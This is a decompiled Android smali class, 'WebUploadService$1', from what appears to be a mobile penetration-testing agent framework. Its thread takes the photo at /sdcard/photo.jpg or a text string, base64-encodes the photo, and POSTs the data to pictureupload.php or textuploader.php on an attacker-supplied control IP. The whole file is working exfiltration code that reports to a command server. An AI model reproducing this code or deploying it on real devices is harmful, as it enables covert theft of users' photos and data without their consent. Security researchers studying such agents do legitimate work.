.class Lcom/bulbsecurity/framework/app/WebUploadService$1;
.super Ljava/lang/Thread;
.source "WebUploadService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bulbsecurity/framework/app/WebUploadService;->onStart(Landroid/content/Intent;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bulbsecurity/framework/app/WebUploadService;

.field final synthetic val$controlIP:Ljava/lang/String;

.field final synthetic val$path:Ljava/lang/String;

.field final synthetic val$uploadstring:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/bulbsecurity/framework/app/WebUploadService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/bulbsecurity/framework/app/WebUploadService;

    .prologue
    .line 35
    iput-object p1, p0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->this$0:Lcom/bulbsecurity/framework/app/WebUploadService;

    iput-object p2, p0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$uploadstring:Ljava/lang/String;

    iput-object p3, p0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$controlIP:Ljava/lang/String;

    iput-object p4, p0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$path:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 17

    .prologue
    .line 38
    move-object/from16 v0, p0

    iget-object v14, v0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$uploadstring:Ljava/lang/String;

    const-string v15, "picture taken"

    invoke-virtual {v14, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14

    if-eqz v14, :cond_0

    .line 41
    const-string v14, "/sdcard/photo.jpg"

    invoke-static {v14}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v2

    .line 42
    .local v2, "bitmap":Landroid/graphics/Bitmap;
    new-instance v9, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v9}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 44
    .local v9, "output":Ljava/io/ByteArrayOutputStream;
    sget-object v14, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v15, 0x64

    invoke-virtual {v2, v14, v15, v9}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 46
    invoke-virtual {v9}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    .line 48
    .local v3, "bytearray":[B
    const/4 v14, 0x0

    invoke-static {v3, v14}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    .line 50
    .local v1, "base":Ljava/lang/String;
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 52
    .local v8, "nameValuePairs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    new-instance v14, Lorg/apache/http/message/BasicNameValuePair;

    const-string v15, "picture"

    invoke-direct {v14, v15, v1}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v8, v14}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 55
    :try_start_0
    new-instance v6, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v6}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 56
    .local v6, "httpclient":Lorg/apache/http/client/HttpClient;
    const-string v5, "http://"

    .line 58
    .local v5, "http":Ljava/lang/String;
    const-string v13, "/pictureupload.php"

    .line 59
    .local v13, "url":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v14, v0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$controlIP:Ljava/lang/String;

    invoke-virtual {v5, v14}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 60
    .local v12, "uri":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v14, v0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$path:Ljava/lang/String;

    invoke-virtual {v12, v14}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 61
    .local v11, "postto1":Ljava/lang/String;
    invoke-virtual {v11, v13}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 62
    .local v10, "postto":Ljava/lang/String;
    new-instance v7, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v7, v10}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 63
    .local v7, "httppost":Lorg/apache/http/client/methods/HttpPost;
    new-instance v14, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    invoke-direct {v14, v8}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    invoke-virtual {v7, v14}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 64
    invoke-interface {v6, v7}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 95
    .end local v1    # "base":Ljava/lang/String;
    .end local v2    # "bitmap":Landroid/graphics/Bitmap;
    .end local v3    # "bytearray":[B
    .end local v5    # "http":Ljava/lang/String;
    .end local v6    # "httpclient":Lorg/apache/http/client/HttpClient;
    .end local v7    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    .end local v9    # "output":Ljava/io/ByteArrayOutputStream;
    .end local v10    # "postto":Ljava/lang/String;
    .end local v11    # "postto1":Ljava/lang/String;
    .end local v12    # "uri":Ljava/lang/String;
    .end local v13    # "url":Ljava/lang/String;
    :goto_0
    return-void

    .line 67
    .restart local v1    # "base":Ljava/lang/String;
    .restart local v2    # "bitmap":Landroid/graphics/Bitmap;
    .restart local v3    # "bytearray":[B
    .restart local v9    # "output":Ljava/io/ByteArrayOutputStream;
    :catch_0
    move-exception v4

    .line 69
    .local v4, "e":Ljava/lang/Exception;
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 76
    .end local v1    # "base":Ljava/lang/String;
    .end local v2    # "bitmap":Landroid/graphics/Bitmap;
    .end local v3    # "bytearray":[B
    .end local v4    # "e":Ljava/lang/Exception;
    .end local v8    # "nameValuePairs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    .end local v9    # "output":Ljava/io/ByteArrayOutputStream;
    :cond_0
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 77
    .restart local v8    # "nameValuePairs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    new-instance v14, Lorg/apache/http/message/BasicNameValuePair;

    const-string v15, "text"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$uploadstring:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-direct/range {v14 .. v16}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v8, v14}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 79
    :try_start_1
    new-instance v6, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v6}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 80
    .restart local v6    # "httpclient":Lorg/apache/http/client/HttpClient;
    const-string v5, "http://"

    .line 81
    .restart local v5    # "http":Ljava/lang/String;
    const-string v13, "/textuploader.php"

    .line 82
    .restart local v13    # "url":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v14, v0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$controlIP:Ljava/lang/String;

    invoke-virtual {v5, v14}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 83
    .restart local v12    # "uri":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v14, v0, Lcom/bulbsecurity/framework/app/WebUploadService$1;->val$path:Ljava/lang/String;

    invoke-virtual {v12, v14}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 84
    .restart local v11    # "postto1":Ljava/lang/String;
    invoke-virtual {v11, v13}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 85
    .restart local v10    # "postto":Ljava/lang/String;
    new-instance v7, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v7, v10}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 86
    .restart local v7    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    new-instance v14, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    invoke-direct {v14, v8}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    invoke-virtual {v7, v14}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 87
    invoke-interface {v6, v7}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    .line 90
    .end local v5    # "http":Ljava/lang/String;
    .end local v6    # "httpclient":Lorg/apache/http/client/HttpClient;
    .end local v7    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    .end local v10    # "postto":Ljava/lang/String;
    .end local v11    # "postto1":Ljava/lang/String;
    .end local v12    # "uri":Ljava/lang/String;
    .end local v13    # "url":Ljava/lang/String;
    :catch_1
    move-exception v4

    .line 92
    .restart local v4    # "e":Ljava/lang/Exception;
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method
